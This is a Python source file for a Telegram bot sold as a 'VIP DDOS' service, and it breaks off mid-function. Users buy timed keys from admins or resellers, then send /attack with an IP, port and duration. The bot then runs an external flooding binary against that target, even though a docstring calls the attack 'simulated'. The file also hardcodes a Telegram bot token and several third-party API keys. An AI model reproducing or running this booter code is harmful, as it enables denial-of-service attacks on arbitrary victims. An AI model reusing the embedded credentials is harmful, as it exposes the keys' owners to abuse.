import os, json, random, string, time, datetime, requests, subprocess, threading
from dotenv import load_dotenv
from google.generativeai import configure, GenerativeModel
#import openai
from telebot import TeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from dateutil.relativedelta import relativedelta
from collections import deque
from functools import lru_cache
import logging

# Configure logging to track errors
logging.basicConfig(filename='bot_errors.log', level=logging.ERROR, format='%(asctime)s - %(levelname)s - %(message)s')

# Bot configuration with API keys and admin IDs
BOT_TOKEN = '7808978161:AAG0aidajxaCci9wSVqX6yTIqMBg9vVJIis'
ADMIN_IDS = {'1807014348', '898181945', '6258297180', '6955279265'}
SUPER_ADMIN_IDS = {'1807014348', '6258297180'}
GEMINI_API_KEY = 'AIzaSyDAm_zAas5YQdQTCI2WoxYDEOXZfwpXUDc'
GIPHY_API_KEY = 'x7jtN4JjenmxkMLDJSSDKxcHMzdxuudT'
PEXELS_API_KEY = '7nwHEnHBPmNh8RDVsIIXnaKd6BH257Io4Sncj5NRd8XijTj9zcfE4vZg'
#OPENAI_API_KEY = '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'

# Initialize Gemini and Telegram bot
configure(api_key=GEMINI_API_KEY)
gemini_model = GenerativeModel('gemini-1.5-flash')
bot = TeleBot(BOT_TOKEN)

# File paths and pricing configuration
USER_FILE, LOG_FILE, KEY_FILE, RESELLERS_FILE, INTERACTIONS_FILE, FEEDBACK_FILE = "users.json", "log.txt", "keys.json", "resellers.json", "interactions.json", "feedback.json"
KEY_COST = {"1hour": 10, "1day": 100, "7days": 450, "1month": 900}

# Initialize files if they don't exist
for f in [USER_FILE, KEY_FILE, RESELLERS_FILE, INTERACTIONS_FILE]:
    if not os.path.exists(f):
        open(f, 'a').close()
    else:
        json.dump({}, open(f, 'w'))
if not os.path.exists(FEEDBACK_FILE):
    open(FEEDBACK_FILE, 'a').close()
else:
    json.dump([], open(FEEDBACK_FILE, 'w'))

# Global state variables
users, keys, resellers, last_attack_time, last_message_time, user_interactions = {}, {}, {}, {}, {}, {}
COOLDOWN_PERIOD, MESSAGE_COOLDOWN, FEEDBACK_PROMPT_THRESHOLD = 60, 5, 3

# Token bucket for rate limiting
class TokenBucket:
    """Manages rate limiting with a token bucket algorithm."""
    def __init__(self, tokens_per_second, max_tokens):
        self.tokens_per_second = tokens_per_second
        self.max_tokens = max_tokens
        self.tokens = max_tokens
        self.last_refill = time.time()
        self.lock = threading.Lock()

    def consume(self, tokens=1):
        with self.lock:
            now = time.time()
            self.tokens += (now - self.last_refill) * self.tokens_per_second
            self.tokens = min(self.tokens, self.max_tokens)
            self.last_refill = now
            if self.tokens >= tokens:
                self.tokens -= tokens
                return True
            return False

telegram_bucket = TokenBucket(0.5, 30)

# Retry decorator for API calls
def with_retry(function, max_attempts=3, base_delay=2, jitter=1, rate_limit_reset=None):
    """Retry function on Telegram API errors with exponential backoff."""
    for attempt in range(max_attempts):
        try:
            return function()
        except telebot.apihelper.ApiTelegramException as error:
            code, description = getattr(error, 'error_code', 0), getattr(error, 'description', '')
            logging.error(f"API Error in {function.__name__}: Attempt {attempt+1}/{max_attempts}, Code {code} - {description}")
            print(f"Err: {error}")
            if code not in [429, 502, 503]:
                raise
            if code == 429 and rate_limit_reset:
                wait_time = max(rate_limit_reset - time.time(), base_delay)
            else:
                wait_time = base_delay * (2 ** attempt)
            wait_time += random.uniform(-jitter, jitter)
            print(f"W {wait_time:.1f}s")
            time.sleep(wait_time)
        if attempt == max_attempts - 1:
            raise

# Sanitize text for MarkdownV2
def sanitize_markdown_v2(text):
    """Escape special characters for MarkdownV2 compatibility."""
    return ''.join(f'\\{c}' if c in '_*[]()~`>#+-=|{}!.]' else c for c in text)

# Cached API calls
@lru_cache(128)
def get_giphy_url(query):
    """Fetch a GIF URL from Giphy API."""
    try:
        response = requests.get(f"https://api.giphy.com/v1/gifs/search?api_key={GIPHY_API_KEY}&q={query}&limit=1").json()
        return response['data'][0]['images']['original']['url'] if response['data'] else None
    except:
        return None

@lru_cache(128)
def get_pexels_image(query):
    """Fetch an image URL from Pexels API."""
    try:
        response = requests.get(f"https://api.pexels.com/v1/search?query={query}&per_page=1", headers={'Authorization': PEXELS_API_KEY}).json()
        return response['photos'][0]['src']['medium'] if response['photos'] else None
    except:
        return None

# Generate Gemini response
def get_gemini_response(message, is_feedback=False, is_super_admin=False):
    """Generate a Hinglish response using Gemini API."""
    try:
        prompt = f"You're a Hinglish bot. {'Respond gratefully with emojis to feedback.' if is_feedback else 'Respond casually, suggest commands.'} {'Respect super admins.' if is_super_admin else ''} Msg: {message}"
        response = gemini_model.generate_content(prompt)
        return sanitize_markdown_v2(response.text.strip() or "😎 /help!")
    except:
        return None

# Check if message is feedback
def is_feedback_message(message):
    """Determine if a message is feedback using Gemini."""
    try:
        prompt = f"Classify if '{message}' is feedback. Return 'yes' or 'no'."
        response = gemini_model.generate_content(prompt)
        return response.text.strip().lower() == 'yes'
    except:
        return False

# Log user interactions
def log_interaction(user_id, message, is_feedback=False):
    """Log user interactions and feedback."""
    user_id = str(user_id)
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    data = {"timestamp": timestamp, "message": message, "is_feedback": is_feedback}
    with open(INTERACTIONS_FILE, 'r') as file:
        interactions = json.load(file)
    interactions.setdefault(user_id, []).append(data)
    with open(INTERACTIONS_FILE, 'w') as file:
        json.dump(interactions, file)
    user_interactions.setdefault(user_id, {"count": 0, "last_feedback": None})
    user_interactions[user_id]["count"] += 1
    if is_feedback:
        user_interactions[user_id]["last_feedback"] = timestamp
        with open(FEEDBACK_FILE, 'r') as file:
            feedback = json.load(file)
        feedback.append({"user_id": user_id, "feedback": message, "timestamp": timestamp})
        with open(FEEDBACK_FILE, 'w') as file:
            json.dump(feedback, file)

# Learn from interactions
def learn_from_interactions(user_id):
    """Analyze past interactions to improve responses."""
    user_id = str(user_id)
    try:
        with open(INTERACTIONS_FILE, 'r') as file:
            interactions = json.load(file)
        data = interactions.get(user_id, [])
        if not data:
            return None
        messages = [i["message"] for i in data]
        prompt = f"Analyze {messages}. Suggest Hinglish style."
        response = gemini_model.generate_content(prompt)
        return response.text.strip()
    except:
        return None

# File read/write functions
def read_users(): return json.load(open(USER_FILE, 'r'))
def save_users(): json.dump(users, open(USER_FILE, 'w'))
def read_keys(): return json.load(open(KEY_FILE, 'r'))
def save_keys(): json.dump(keys, open(KEY_FILE, 'w'))
def load_resellers(): return json.load(open(RESELLERS_FILE, 'r'))
def save_resellers(reseller_data): json.dump(reseller_data, open(RESELLERS_FILE, 'w'))

# Utility functions
def create_random_key(length=10):
    """Generate a random key with a prefix."""
    return f"`Rahul-{''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length)).upper()}`"

def add_time_to_current_date(years=0, months=0, days=0, hours=0, minutes=0, seconds=0):
    """Add time to the current datetime."""
    return datetime.datetime.now() + relativedelta(years=years, months=months, days=days, hours=hours, minutes=minutes, seconds=seconds)

def set_cooldown(seconds):
    """Set the global cooldown period."""
    global COOLDOWN_PERIOD
    COOLDOWN_PERIOD = seconds
    json.dump({"cooldown": seconds}, open("cooldown.json", 'w'))

def load_cooldown():
    """Load the cooldown period from file."""
    global COOLDOWN_PERIOD
    try:
        COOLDOWN_PERIOD = json.load(open("cooldown.json", 'r'))["cooldown"]
    except:
        COOLDOWN_PERIOD = 0

def log_command(user_id, target, port, time_interval):
    """Log command details to file."""
    with open(LOG_FILE, 'a') as file:
        file.write(f"Username: {bot.get_chat(user_id).username or user_id}\nTarget: {target}\nPort: {port}\nTime: {time_interval}\n\n")

def record_command_logs(user_id, command, target=None, port=None, time_interval=None):
    """Record command logs with detailed metadata."""
    log_text = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}" + \
               (f" | Target: {target}" if target else '') + \
               (f" | Port: {port}" if port else '') + \
               (f" | Time: {time_interval}" if time_interval else '')
    with open(LOG_FILE, 'a') as file:
        file.write(log_text + '\n')

def send_attack_finished_message(chat_id, user_id):
    """Send a completion message after an attack."""
    response = "🏁 *Atk done, Bhai!* 🍗" + ("\n👑 *O Boss, shukriya!* 🙌" if user_id in SUPER_ADMIN_IDS else '')
    gif = get_giphy_url("success")
    with_retry(lambda: bot.send_message(chat_id, response, parse_mode='MarkdownV2') or
               (bot.send_animation(chat_id, gif) if gif else None))

# Inline keyboard menus
def create_main_menu(user_id):
    """Create the main menu with dynamic buttons."""
    keyboard = InlineKeyboardMarkup()
    keyboard.row(InlineKeyboardButton("🔥 Attack 🌌", "menu_attack"))
    keyboard.row(InlineKeyboardButton("🗝️ Redeem Key 🚀", "menu_redeem"))
    keyboard.row(InlineKeyboardButton("ℹ️ My Info 🪐", "menu_myinfo"))
    if user_id in ADMIN_IDS or user_id in resellers:
        keyboard.row(InlineKeyboardButton("🔑 Generate Key 💫", "menu_genkey"))
    if user_id in ADMIN_IDS:
        keyboard.row(InlineKeyboardButton("🛠️ Admin Panel 👑", "menu_admin"))
    keyboard.row(InlineKeyboardButton("😜 Masti ✨", "menu_masti"))
    keyboard.add(InlineKeyboardButton("🔙 Back", "menu_main"))
    return keyboard

def create_genkey_menu():
    """Create the key generation menu."""
    keyboard = InlineKeyboardMarkup()
    for duration in ['1hour', '1day', '7days', '1month']:
        keyboard.add(InlineKeyboardButton(f"{duration.title()} Key 💫", f"genkey_{duration}"))
    keyboard.add(InlineKeyboardButton("🔙 Back", "menu_main"))
    return keyboard

def create_admin_menu():
    """Create the admin panel menu."""
    keyboard = InlineKeyboardMarkup()
    keyboard.row(InlineKeyboardButton("📋 Logs 🌌", "admin_logs"))
    keyboard.row(InlineKeyboardButton("👥 Users 🚀", "admin_users"))
    keyboard.row(InlineKeyboardButton("🤝 Resellers 🪐", "admin_resellers"))
    keyboard.row(InlineKeyboardButton("⏳ Set Cooldown 💫", "admin_setcooldown"))
    keyboard.add(InlineKeyboardButton("🔙 Back", "menu_main"))
    return keyboard

# Message and callback handlers
@bot.message_handler(content_types=['text'])
def handle_all_messages(message):
    """Handle all text messages with commands and casual responses."""
    user_id = str(message.chat.id)
    text = message.text.lower().strip()
    if message.chat.type != 'private':
        bot.reply_to(message, "🚫 *DM mein!* 😎", parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))
        return
    if text.startswith('/'):
        log_interaction(user_id, text)
        return
    if user_id not in ADMIN_IDS:
        time_since_last = (datetime.datetime.now() - last_message_time.get(user_id, datetime.datetime.now())).total_seconds()
        if time_since_last < MESSAGE_COOLDOWN:
            bot.reply_to(message, "🚫 *Spam mat kar!* 😎", parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))
            return
    last_message_time[user_id] = datetime.datetime.now()
    is_feedback = is_feedback_message(text)
    log_interaction(user_id, text, is_feedback)
    if is_feedback:
        response = get_gemini_response(text, True, user_id in SUPER_ADMIN_IDS) or "🙏 *Shukriya, bhai!* 😎"
        if user_id in SUPER_ADMIN_IDS:
            response += "\n👑 *O Boss, shukriya!* 🙌"
        gif = get_giphy_url("thank you")
        with_retry(lambda: bot.send_animation(message.chat.id, gif, caption=response, parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id)) if gif else
                   bot.reply_to(message, response, parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id)))
        return
    if user_id in user_interactions and user_interactions[user_id]["count"] >= FEEDBACK_PROMPT_THRESHOLD and not user_interactions[user_id]["last_feedback"]:
        response = "😎 *Feedback de na, bhai!* 🫶"
        if user_id in SUPER_ADMIN_IDS:
            response += "\n👑 *O Boss, shukriya!* 🙌"
        bot.reply_to(message, response, parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))
        user_interactions[user_id]["count"] = 0
    learned = learn_from_interactions(user_id)
    response = get_gemini_response(text, False, user_id in SUPER_ADMIN_IDS) if learned else \
               "🤔 *Samajh nahi aaya!* 😅" if not any(keyword in text for keyword in ['attack', 'strike', 'ddos', 'key', 'redeem', 'access', 'info', 'status', 'whoami', 'bhai', 'bro', 'dost', 'masti', 'fun', 'joke']) else \
               "🔥 */attack <ip> <port> <time>*" if 'attack' in text else \
               "🗝️ */redeem*" if 'key' in text else \
               "ℹ️ */myinfo*" if 'info' in text else \
               "😎 *Bol, bhai!* 🛠️" if 'bhai' in text else \
               "😜 */masti*" if 'masti' in text else \
               random.choice(["🤔 *Kya bol raha?* 😅", "😎 *Seedha bol na!* 🔥", "🎬 *Bollywood vibe!* 😜"])
    if user_id in SUPER_ADMIN_IDS:
        response += "\n👑 *O Boss, shukriya!* 🙌"
    gif = get_giphy_url("hacker" if "attack" in text else "funny" if "masti" in text else "king" if user_id in SUPER_ADMIN_IDS else "bhai")
    with_retry(lambda: bot.send_animation(message.chat.id, gif, caption=response, parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id)) if gif else
               bot.reply_to(message, response, parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id)))

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    """Handle inline keyboard callbacks."""
    user_id = str(call.from_user.id)
    data = call.data
    log_interaction(user_id, f"Button: {data}")
    try:
        def execute():
            if not telegram_bucket.consume():
                raise telebot.apihelper.ApiTelegramException(429, "Rate limit")
            if data == "menu_main":
                response = "🌌 *VIP DDOS, Bhai!* 😎"
                if user_id in SUPER_ADMIN_IDS:
                    response += "\n👑 *O Boss, shukriya!* 🙌"
                image = get_pexels_image("galaxy")
                with_retry(lambda: bot.edit_message_media(chat_id=call.message.chat.id, message_id=call.message.message_id,
                                                        media=telebot.types.InputMediaPhoto(image, caption=response, parse_mode='MarkdownV2'),
                                                        reply_markup=create_main_menu(user_id)) if image else
                           bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                                                 text=response, reply_markup=create_main_menu(user_id), parse_mode='MarkdownV2'))
            elif data == "menu_genkey":
                response = "🔑 *Key Time!* 😎"
                if user_id in SUPER_ADMIN_IDS:
                    response += "\n👑 *O Boss, shukriya!* 🙌"
                image = get_pexels_image("key")
                with_retry(lambda: bot.edit_message_media(chat_id=call.message.chat.id, message_id=call.message.message_id,
                                                        media=telebot.types.InputMediaPhoto(image, caption=response, parse_mode='MarkdownV2'),
                                                        reply_markup=create_genkey_menu()) if image else
                           bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                                                 text=response, reply_markup=create_genkey_menu(), parse_mode='MarkdownV2'))
            elif data == "menu_attack":
                response = "🔥 *Attack Mode!* 🔥\n*/attack <ip> <port> <time>*"
                if user_id in SUPER_ADMIN_IDS:
                    response += "\n👑 *O Boss, shukriya!* 🙌"
                bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=response, parse_mode='MarkdownV2')
            elif data == "menu_redeem":
                response = "🗝️ *Redeem Key!*"
                if user_id in SUPER_ADMIN_IDS:
                    response += "\n👑 *O Boss, shukriya!* 🙌"
                bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=response, parse_mode='MarkdownV2')
                bot.register_next_step_handler(call.message, process_redeem_key)
            elif data == "menu_myinfo":
                username = call.from_user.username or "No username"
                response = f"ℹ️ *Info, Bhai!* 😎\n👤 @{username}\n🆔 {user_id}\n🎭 {['Guest', 'User', 'Reseller', 'Admin', 'Overlord'][4*(user_id in SUPER_ADMIN_IDS) + 3*(user_id in ADMIN_IDS) + 2*(user_id in resellers) + 1*(user_id in users)]}\n⏰ {users.get(user_id, 'No key')}"
                if user_id in resellers:
                    response += f"\n💰 {resellers[user_id]} Rs"
                if user_id in SUPER_ADMIN_IDS:
                    response += "\n👑 *O Boss, shukriya!* 🙌"
                image = get_pexels_image("profile")
                with_retry(lambda: bot.edit_message_media(chat_id=call.message.chat.id, message_id=call.message.message_id,
                                                        media=telebot.types.InputMediaPhoto(image, caption=response, parse_mode='MarkdownV2'),
                                                        reply_markup=create_main_menu(user_id)) if image else
                           bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                                                 text=response, reply_markup=create_main_menu(user_id), parse_mode='MarkdownV2'))
            elif data == "menu_admin":
                response = "🛠️ *Admin Panel!* 😎"
                if user_id in SUPER_ADMIN_IDS:
                    response += "\n👑 *O Boss, shukriya!* 🙌"
                bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=response, reply_markup=create_admin_menu(), parse_mode='MarkdownV2')
            elif data == "menu_masti":
                response = random.choice(["🎬 *DDOS Don!* 😎", "💻 *Wi-Fi bachao!* 😜", "🔥 *Mummy: Padhai kar!* 😅", "😎 *Chai time!* ☕"])
                if user_id in SUPER_ADMIN_IDS:
                    response += "\n👑 *O Boss, shukriya!* 🙌"
                gif = get_giphy_url("funny")
                with_retry(lambda: bot.send_animation(chat_id=call.message.chat.id, animation=gif, caption=response, parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id)) if gif else
                           bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=response, reply_markup=create_main_menu(user_id), parse_mode='MarkdownV2'))
        with_retry(execute, 3, 2, 1)
    except telebot.apihelper.ApiTelegramException as error:
        code, description = getattr(error, 'error_code', 0), getattr(error, 'description', '')
        if code == 400 and 'no text' in description.lower():
            if data == "menu_genkey":
                bot.send_message(call.message.chat.id, "🔑 *Key Time!* 😎", parse_mode='MarkdownV2', reply_markup=create_genkey_menu())
            elif data == "menu_main":
                bot.send_message(call.message.chat.id, "🌌 *VIP DDOS, Bhai!* 😎", parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))
        else:
            bot.send_message(call.message.chat.id, f"😓 *Error: {description}* 😱", parse_mode='MarkdownV2')

@bot.message_handler(commands=['start'])
def start_command(message):
    """Handle the /start command with a welcome message."""
    user_id = str(message.chat.id)
    log_interaction(user_id, "/start")
    if message.chat.type != 'private':
        bot.reply_to(message, "🚫 *DM mein!* 😎", parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))
        return
    def execute():
        if not telegram_bucket.consume():
            raise telebot.apihelper.ApiTelegramException(429, "Rate limit")
        response = "🚀 *VIP DDOS BOT*\n╦════╗\n║ Bhai! ║\n╚════╝\n🌌 *Welcome!* 😎"
        if user_id in SUPER_ADMIN_IDS:
            response += "\n👑 *O Boss, shukriya!* 🙌"
        image = get_pexels_image("galaxy")
        with_retry(lambda: bot.send_photo(chat_id=message.chat.id, photo=image, caption=response, parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id)) if image else
                   bot.reply_to(message, response, parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id)))
    try:
        with_retry(execute, 3, 2, 1)
    except telebot.apihelper.ApiTelegramException as error:
        bot.reply_to(message, f"😓 *Error: {error}* 😱", parse_mode='MarkdownV2')

@bot.message_handler(commands=['help'])
def help_command(message):
    """Handle the /help command with admin instructions."""
    user_id = str(message.chat.id)
    log_interaction(user_id, "/help")
    if message.chat.type != 'private':
        bot.reply_to(message, "🚫 *DM mein!* 😎", parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))
        return
    if user_id not in ADMIN_IDS:
        response = "🚫 *Admin only!* 😎" + ("\n👑 *O Boss, shukriya!* 🙌" if user_id in SUPER_ADMIN_IDS else '')
        gif = get_giphy_url("access denied")
        with_retry(lambda: bot.send_animation(chat_id=message.chat.id, animation=gif, caption=response, parse_mode='MarkdownV2') if gif else
                   bot.reply_to(message, response, parse_mode='MarkdownV2'))
        return
    response = "🛠️ *ADMIN PANEL*\n═════\n*/start, /help*\n*/attack <ip> <port> <time>*, */setcooldown <s>*, */checkcooldown*\n*/add_reseller <id> <bal>*, */genkey <d>*, */logs*, */users*, */remove <id>*, */resellers*, */addbalance <id> <amt>*, */remove_reseller <id>*\n*Feedback anytime!*\n😎 @Rahul_618"
    if user_id in SUPER_ADMIN_IDS:
        response += "\n👑 *O Boss, shukriya!* 🙌"
    bot.reply_to(message, response, parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))

@bot.message_handler(commands=['myinfo'])
def my_info(message):
    """Handle the /myinfo command to display user details."""
    user_id = str(message.chat.id)
    log_interaction(user_id, "/myinfo")
    if message.chat.type != 'private':
        bot.reply_to(message, "🚫 *DM mein!* 😎", parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))
        return
    username = message.chat.username or "No username"
    response = f"ℹ️ *Info, Bhai!* 😎\n👤 @{username}\n🆔 {user_id}\n🎭 {['Guest', 'User', 'Reseller', 'Admin', 'Overlord'][4*(user_id in SUPER_ADMIN_IDS) + 3*(user_id in ADMIN_IDS) + 2*(user_id in resellers) + 1*(user_id in users)]}\n⏰ {users.get(user_id, 'No key')}"
    if user_id in resellers:
        response += f"\n💰 {resellers[user_id]} Rs"
    if user_id in SUPER_ADMIN_IDS:
        response += "\n👑 *O Boss, shukriya!* 🙌"
    image = get_pexels_image("profile")
    with_retry(lambda: bot.send_photo(chat_id=message.chat.id, photo=image, caption=response, parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id)) if image else
               bot.reply_to(message, response, parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id)))

@bot.message_handler(commands=['masti'])
def masti_command(message):
    """Handle the /masti command with fun responses."""
    user_id = str(message.chat.id)
    log_interaction(user_id, "/masti")
    if message.chat.type != 'private':
        bot.reply_to(message, "🚫 *DM mein!* 😎", parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))
        return
    response = random.choice(["🎬 *DDOS Don!* 😎", "💻 *Wi-Fi bachao!* 😜", "🔥 *Mummy: Padhai!* 😅", "😎 *Chai time!* ☕"])
    if user_id in SUPER_ADMIN_IDS:
        response += "\n👑 *O Boss, shukriya!* 🙌"
    gif = get_giphy_url("funny")
    with_retry(lambda: bot.send_animation(chat_id=message.chat.id, animation=gif, caption=response, parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id)) if gif else
               bot.reply_to(message, response, parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id)))

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    """Handle the /attack command for simulated attacks."""
    user_id = str(message.chat.id)
    log_interaction(user_id, message.text)
    if message.chat.type != 'private':
        bot.reply_to(message, "🚫 *DM mein!* 😎", parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))
        return
    if user_id not in ADMIN_IDS and user_id not in users:
        response = "🚫 *Unauthorized!* 😜\n📞 @Rahul_618" + ("\n👑 *O Boss, shukriya!* 🙌" if user_id in SUPER_ADMIN_IDS else '')
        gif = get_giphy_url("access denied")
        with_retry(lambda: bot.send_animation(chat_id=message.chat.id, animation=gif, caption=response, parse_mode='MarkdownV2') if gif else
                   bot.reply_to(message, response, parse_mode='MarkdownV2'))
        return
    if user_id in users and datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        bot.reply_to(message, "⏰ *Key expired!* 😎", parse_mode='MarkdownV2')
        return
    if user_id in last_attack_time and (datetime.datetime.now() - last_attack_time[user_id]).total_seconds() < COOLDOWN_PERIOD:
        response = f"😎 *Cooldown: {int(COOLDOWN_PERIOD - (datetime.datetime.now() - last_attack_time[user_id]).total_seconds())}s* ⏳" + ("\n👑 *O Boss, shukriya!* 🙌" if user_id in SUPER_ADMIN_IDS else '')
        bot.reply_to(message, response, parse_mode='MarkdownV2')
        return
    command = message.text.split()
    if len(command) != 4:
        response = "🔥 *Attack Mode!* 🔥\n*/attack <ip> <port> <time>*"
        if user_id in SUPER_ADMIN_IDS:
            response += "\n👑 *O Boss, shukriya!* 🙌"
        bot.reply_to(message, response, parse_mode='MarkdownV2')
        return
    target, port, time_interval = command[1], int(command[2]), int(command[3])
    if time_interval > 240:
        response = "⏰ *Max 240s!* 😅" + ("\n👑 *O Boss, shukriya!* 🙌" if user_id in SUPER_ADMIN_IDS else '')
        gif = get_giphy_url("time")
        with_retry(lambda: bot.send_animation(chat_id=message.chat.id, animation=gif, caption=response, parse_mode='MarkdownV2') if gif else
                   bot.reply_to(message, response, parse_mode='MarkdownV2'))
        return
    record_command_logs(user_id, 'attack', target, port, time_interval)
    log_command(user_id, target, port, time_interval)
    execute_attack(target, port, time_interval, message.chat.id, message.chat.username or user_id, last_attack_time, user_id)

def execute_attack(target, port, time_interval, chat_id, username, last_attack, user_id):
    """Execute a simulated attack with progress updates."""
    try:
        packet_size = 1200
        if packet_size < 1 or packet_size > 65507:
            response = "😓 *Packet size 1–65507!* 👽"
            bot.send_message(chat_id, response, parse_mode='MarkdownV2')
            return
        command = ['./Rohan', target, str(packet_size), str(time_interval), str(packet_size)]
        response = f"🔥 *Attack Shuru!* 🎯 {target}:{port} ⏰ {time_interval}s 📦 {packet_size}b ⚡ 512 👨‍💻 @{username}"
        if user_id in SUPER_ADMIN_IDS:
            response += "\n👑 *O Boss, shukriya!* 🙌"
        image = get_pexels_image("hacker")
        with_retry(lambda: bot.send_photo(chat_id, image, caption=response, parse_mode='MarkdownV2') if image else
                   bot.send_message(chat_id, response, parse_mode='MarkdownV2'))
        message = bot.send_message(chat_id, "📊 *Progress...* 🌠", parse_mode='MarkdownV2')
        for i in range(1, 13):
            time.sleep(time_interval / 12)
            with_retry(lambda: bot.edit_message_text(chat_id, message.message_id,
                                                    f"📊 [{('█' * int(i * 8.33 / 8.33)) + '□' * (12 - int(i * 8.33 / 8.33))} {i * 8.33:.1f}%] 🌠",
                                                    parse_mode='MarkdownV2'))
        subprocess.run(command, check=True)
        threading.Timer(time_interval, send_attack_finished_message, [chat_id, user_id]).start()
        last_attack[user_id] = datetime.datetime.now()
    except Exception as error:
        response = f"😓 *Error: {str(error)}* 😱" + ("\n👑 *O Boss, shukriya!* 🙏" if user_id in SUPER_ADMIN_IDS else '')
        gif = get_giphy_url("error")
        with_retry(lambda: bot.send_animation(chat_id, gif, caption=response, parse_mode='MarkdownV2') if gif else
                   bot.send_message(chat_id, response, parse_mode='MarkdownV2'))

@bot.message_handler(commands=['genkey'])
def generate_key(message):
    """Handle the /genkey command to show key generation menu."""
    user_id = str(message.chat.id)
    log_interaction(user_id, "/genkey")
    if message.chat.type != 'private':
        bot.reply_to(message, "🚫 *DM mein!* 😎", parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))
        return
    response = "🔑 *Key Time!* 😎"
    if user_id in SUPER_ADMIN_IDS:
        response += "\n👑 *O Boss, shukriya!* 🙌"
    bot.reply_to(message, response, parse_mode='MarkdownV2', reply_markup=create_genkey_menu())

@bot.message_handler(commands=['redeem'])
def redeem_key_prompt(message):
    """Handle the /redeem command to prompt for a key."""
    user_id = str(message.chat.id)
    log_interaction(user_id, "/redeem")
    if message.chat.type != 'private':
        bot.reply_to(message, "🚫 *DM mein!* 😎", parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))
        return
    response = "🗝️ *Drop Key!*"
    if user_id in SUPER_ADMIN_IDS:
        response += "\n👑 *O Boss, shukriya!* 🙌"
    bot.reply_to(message, response, parse_mode='MarkdownV2')
    bot.register_next_step_handler(message, process_redeem_key)

def process_redeem_key(message):
    """Process the key redemption from user input."""
    user_id = str(message.chat.id)
    log_interaction(user_id, message.text)
    key = message.text.strip()
    if key in keys:
        if user_id in users and datetime.datetime.now() < datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
            bot.reply_to(message, "😎 *Already active!*", parse_mode='MarkdownV2')
            return
        duration = keys[key]["duration"]
        # Map duration to time increments
        duration_map = {
            "1hour": {"hours": 1},
            "1day": {"days": 1},
            "7days": {"days": 7},
            "1month": {"months": 1}
        }
        expiration = add_time_to_current_date(**duration_map[duration])
        users[user_id] = expiration.strftime('%Y-%m-%d %H:%M:%S')
        save_users()
        del keys[key]
        save_keys()
        response = f"🎉 *Access till {users[user_id]}!*"
        if user_id in SUPER_ADMIN_IDS:
            response += "\n👑 *O Boss, shukriya!* 🙌"
        gif = get_giphy_url("success")
        with_retry(lambda: bot.send_animation(message.chat.id, gif, caption=response, parse_mode='MarkdownV2') if gif else
                   bot.reply_to(message, response, parse_mode='MarkdownV2'))
    else:
        response = "😥 *Invalid key!* 😎"
        if user_id in SUPER_ADMIN_IDS:
            response += "\n👑 *O Boss, shukriya!* 🙌"
        gif = get_giphy_url("error")
        with_retry(lambda: bot.send_animation(message.chat.id, gif, caption=response, parse_mode='MarkdownV2') if gif else
                   bot.reply_to(message, response, parse_mode='MarkdownV2'))

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    """Handle the /logs command to send log file."""
    user_id = str(message.chat.id)
    log_interaction(user_id, "/logs")
    if message.chat.type != 'private':
        bot.reply_to(message, "🚫 *DM mein!* 😎", parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))
        return
    if user_id in ADMIN_IDS:
        response = "📋 *Logs!* 😎" + ("\n👑 *O Boss, shukriya!* 🙌" if user_id in SUPER_ADMIN_IDS else '')
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            with open(LOG_FILE, 'rb') as file:
                bot.send_document(chat_id=message.chat.id, document=file, caption=response, parse_mode='MarkdownV2')
        else:
            bot.reply_to(message, "😓 *No logs!* 😎", parse_mode='MarkdownV2')
    else:
        response = "🚫 *Admin only!* 😎" + ("\n👑 *O Boss, shukriya!* 🙌" if user_id in SUPER_ADMIN_IDS else '')
        bot.reply_to(message, response, parse_mode='MarkdownV2')

@bot.message_handler(commands=['users'])
def list_authorized_users(message):
    """Handle the /users command to list all users."""
    user_id = str(message.chat.id)
    log_interaction(user_id, "/users")
    if message.chat.type != 'private':
        bot.reply_to(message, "🚫 *DM mein!* 😎", parse_mode='MarkdownV2', reply_markup=create_main_menu(user_id))
        return
    if user_id not in ADMIN_IDS:
        response = "🚫 *Admin only!* 😎" + ("\n👑 *O Boss, shukriya!* 🙌" if user_id in SUPER_ADMIN_IDS else '')
        bot.reply_to(message, response, parse_mode='MarkdownV2')
        return
    response = "👥 *Users!* 😎" + ("\n👑 *O Boss, shukriya!* 🙌\n" if user_id in SUPER_ADMIN_IDS else '\n')
